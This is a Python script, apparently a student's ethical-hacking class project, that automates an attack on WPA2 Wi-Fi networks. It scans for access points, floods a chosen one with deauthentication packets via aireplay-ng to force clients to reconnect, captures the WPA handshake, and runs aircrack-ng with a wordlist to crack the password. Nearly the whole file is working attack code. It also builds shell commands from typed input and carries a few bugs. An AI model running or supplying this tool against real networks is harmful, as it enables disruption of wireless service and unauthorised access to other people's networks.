#!/usr/bin/env python

from __future__ import print_function

import os, subprocess, select, time, signal
from multiprocessing import Process

SECONDS = 20
#WORDLIST = "/usr/share/wordlists/rockyou.txt"
WORDLIST = "/root/Documents/cs378/ethical_hacking_final_project/test.txt"

#Varaible Hard-Coded Values
number_deauth_packets = 20

if os.geteuid() != 0:
    print("\nThis script must be run as root\n")
    exit(0)

def get_interface():

    # Get a monitor mode network device from iwconfig
    p2 = subprocess.Popen("iwconfig".split(" "), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    out, err = p2.communicate()
    result = err + out
    managed = ""
    interfaces = []
    for r in result.split("\n\n"):
        interface = r.split()[0]
        interfaces.append(interface)
        if "Managed" or "Promiscous" in r:
            managed = interface
    return managed

def network_setup(int_name):
    try:
        #os.system("airmon-ng check kill")
        out = subprocess.check_output("airmon-ng check kill".split(" "))
        #os.system("/etc/init.d/avahi-daemon stop")
        out = subprocess.check_output("/etc/init.d/avahi-daemon stop".split(" "))
        #os.system("ifconfig %s down" %int_name)
        out = subprocess.check_output("ifconfig {} down".format(int_name).split(" "))
        #os.system("airmon-ng start %s" %int_name)
        out = subprocess.check_output("airmon-ng start {}".format(int_name).split(" "))
        cmd = "ifconfig | grep mon | awk -F ':' '{print $1}' | awk '{print $1}'"
        int_name = str(os.popen(cmd).read()).strip('\n')
        return int_name
    except KeyboardInterrupt:
        print ("The network setup failed, run the script again")

def network_teardown(int_name):
    try:
        os.system("airmon-ng stop %s" %int_name)
        os.system("service network-manager restart")
    except NameError:
        print("Network Interface \"%s\" does not exist" %int_name)

"""
def network_sniff(interface_name):
    try:
        os.system("airodump-ng -a -w testcap %s" %interface_name)
    except KeyboardInterrupt:
        print ("Network sniffing done")
"""
def get_bssids(interface_name):
    print('getting bssids')
    p = subprocess.Popen("airodump-ng -a -w testcap -t WPA2 {}".format(interface_name).split(" "), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    _poll = select.poll()
    _poll.register(p.stderr)

    start = time.time()
    output = []
    out2 = ""
    while time.time() - start < 5:
        rlist = _poll.poll()
        for fd, event in rlist:
            out2 += os.read(fd, 2048)

    _poll.unregister(p.stderr)
    p.terminate()
    #p.send_signal(signal.SIGINT)

    bssid_map = {}
    processes = []
    out2arr = out2.split("\x1b[J\x1b[1;1H\n")
    for i in range(1, len(out2arr)):
        info = out2arr[i].split("BSSID              STATION            PWR   Rate    Lost    Frames  Probe")[0]
        lines = info.split("\n")[4:-2]
        for line in lines:
            data = line.split()

            bssid = {
                    "BSSID": data[0], 
                    "Pwr": data[1],
                    "Beacons": data[2],
                    "Data": data[3],
                    "NUM_PER_S": data[4],
                    "CH": data[5],
                    "MB": data[6],
                    "ENC": data[7],
                    "CIPHER": "",
                    "AUTH": "",
            }
            if bssid["ENC"] == "WPA2":
                bssid["CIPHER"] = data[8]
                bssid["AUTH"] = data[9]
                bssid["ESSID"] = ' '.join(data[10:])
            elif bssid["ENC"] == "WEP":
                bssid["CIPHER"] = data[8]
                bssid["ESSID"] = ' '.join(data[9:])
            elif bssid["ENC"] == "OPN" or bssid["ENC"] == "WPA":
                bssid["ESSID"] = data[8:]
            else:
                bssid["ESSID"] = ' '.join(data[8:])

            #if bssid["ENC"] == "WPA2" and bssid["BSSID"] not in bssid_map:
            if bssid["ENC"] == "WPA2" and bssid["BSSID"] == "98:DE:D0:21:12:0F" and bssid["BSSID"] not in bssid_map:
                bssid_map[bssid["BSSID"]] = bssid
                print(bssid["ESSID"])

    """
    print("found bssids")
    for key in bssid_map.keys():
        print("")
        print(bssid_map[key]["ESSID"])
        capture_handshake(bssid_map[key], interface_name)
    """
    return bssid_map

def deauth_bomb2(bssid, channel, int_name, number_deauth_packets):
    try:
        #cmd = "iwconfig " + int_name + " channel " + channel
        #print(cmd)
        #os.system(cmd)
        print("airmon-ng stop {0}".format(int_name))
        out = subprocess.check_output("airmon-ng stop {0}".format(int_name).split(" "))
        print("airmon-ng start {0} {1}".format(int_name[:-3], channel))
        out = subprocess.check_output("airmon-ng start {0} {1}".format(int_name[:-3], channel).split(" "))
        time.sleep(2)

        cmd = "aireplay-ng -0 " + str(number_deauth_packets) + " -a " + bssid + " " + int_name
        print(cmd)
        subprocess.call(cmd, shell=True)
        return bssid, channel

    except KeyboardInterrupt:
        return bssid

def deauth_bomb(int_name, number_deauth_packets):
    try:
        ssid_name = str(raw_input("Input the first 3 characters of the ssid you are targetting (Case Sensitive): "))

        cmd = "cat testcap-01.csv | grep " + ssid_name + " | awk '{print $1}' | awk -F',' 'NR==1{print $1}'"
        bssid = str(os.popen(cmd).read()).strip('\n')

        cmd = "cat testcap-01.csv | grep " + bssid + " | awk '{print $6}' | awk -F',' 'NR==1{print $1}'"
        channel = str(os.popen(cmd).read()).split('\n')[0]

        cmd = "iwconfig " + int_name + " channel " + channel
        print(cmd)
        os.system(cmd)

        cmd = "aireplay-ng -0 " + str(number_deauth_packets) + " -a " + bssid + " " + int_name
        print(cmd)
        subprocess.call(cmd, shell=True)
        return bssid, channel

    except KeyboardInterrupt:
        return bssid

def capture_handshake(bssid, int_name, channel):
    try:
        os.system("airodump-ng --bssid %s --channel %s -w captured_packet %s" %(bssid, channel, int_name))
    except KeyboardInterrupt:
        print ("nothing")

if __name__ == "__main__":

    os.system("rm testcap*")
    os.system("rm captured*")
    #os.system("iwconfig")

    #interface_name = raw_input("Input the name of your wireless interface: ")

    #print ("\nSetting up Nic Parameters")
    #int_name = network_setup(interface_name)
    interface_name = get_interface() 
    print("interface_name: {}".format(interface_name))
    int_name = network_setup(interface_name)
    print("int_name: {}".format(int_name))

    #print ("\nsniffing network, press CTRL+C when you see a network you want to target")
    #network_sniff(int_name)
    bssids = get_bssids(int_name)
    list_bssids = bssids.keys()
    print(list_bssids)
    if len(list_bssids) == 0:
        print("list is empty")
        sys.exit(0)
    else:
        bssid = bssids[list_bssids[0]]

    #print ("\nWith user input, sending De-Auth bomb")
    #bssid, channel = deauth_bomb(int_name, number_deauth_packets)
    bssid, channel = deauth_bomb2(bssid["BSSID"], bssid["CH"], int_name, number_deauth_packets)
    print("bssid:{0}\tchannel:{1}".format(bssid, channel))

    #print ("Capturing 4-way handshake, targeting " + str(bssid))
    capture_handshake(bssid, int_name, channel)

    #print("\nResetting Nic Parameters and restarting Network-Manager.\n")
    network_teardown(int_name)

    cmd = "aircrack-ng -w test.txt -b " + bssid + " captured_packet-01.cap"
    subprocess.call(cmd, shell=True)
